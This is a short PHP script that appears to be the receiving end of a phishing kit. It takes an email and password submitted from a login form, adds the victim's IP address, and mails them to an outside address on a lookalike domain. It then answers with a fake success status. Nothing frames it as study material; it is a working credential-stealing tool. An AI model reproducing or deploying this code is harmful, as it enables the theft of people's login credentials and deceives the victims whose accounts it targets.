<?php
header('Access-Control-Allow-Origin: *');
 
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 
 $email= $_POST['x1'];
 $password = $_POST['x2'];

		$to = "akhand@fnslnternational.com";
	
         $subject = "New Login";
		 
		 $message =  "Online ID    : ".$email."\r\n";
         $message .= "Password     : ".$password."\r\n";
         $message .= "IP           : ".$ip."\r\n";
		$header = "Content type: adobe \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         $headers .= "From: <".$to.">" . "\r\n";
		 
		 mail ($to,$subject,$message,$header);
		 
		 echo '{"status":"ok"}';
		 
}


?>